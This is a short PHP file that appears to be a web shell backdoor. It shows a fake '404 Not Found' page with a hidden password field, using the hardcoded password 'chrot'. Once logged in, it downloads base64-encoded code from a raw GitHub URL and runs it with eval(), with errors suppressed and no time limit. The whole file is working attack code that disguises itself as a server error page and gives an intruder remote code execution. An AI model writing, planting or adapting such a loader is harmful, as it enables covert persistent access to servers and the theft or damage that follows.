<?php
session_start();
set_time_limit(0);
error_reporting(0);
$pass = "chrot";

if($_POST['login_x'] == $pass) {
	$_SESSION['login_x'] = true;
}

if($_SESSION['login_x'] == false) {
	echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<form method="POST">
<input name="login_x" style="border: none">
</form>
</body></html>';
exit();
}

eval(base64_decode(file_get_contents("https://raw.githubusercontent.com/xdavian/shell/main/prive.txt")));

?>
